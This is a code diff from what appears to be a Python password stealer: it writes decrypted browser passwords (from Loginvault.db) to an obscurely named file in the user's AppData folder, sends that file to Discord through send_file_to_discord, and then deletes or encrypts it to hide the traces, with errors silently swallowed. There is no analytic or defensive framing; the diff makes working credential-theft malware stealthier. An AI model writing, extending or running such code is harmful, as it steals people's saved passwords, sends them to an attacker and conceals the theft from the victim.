@@ -115,9 +115,17 @@ if __name__ == '__main__':
                     encrypt_file("Loginvault.db")
 
         if decrypted_passwords:
-            with open('decrypted_password.txt', 'w', encoding='utf-8') as f:
+            appdata_folder = os.path.join(os.path.expanduser("~"), "AppData", "Local")
+            file_name = 'dP-3874978373987.txt'
+            file_path = os.path.join(appdata_folder, file_name)
+            with open(file_path, 'w', encoding='utf-8') as f:
                 f.write('\n'.join(decrypted_passwords))
-            send_file_to_discord('decrypted_password.txt')
+            send_file_to_discord(file_path)
+
+            try:
+                os.remove(file_path)
+            except:
+                encrypt_file(file_path)
 
     except:
         pass
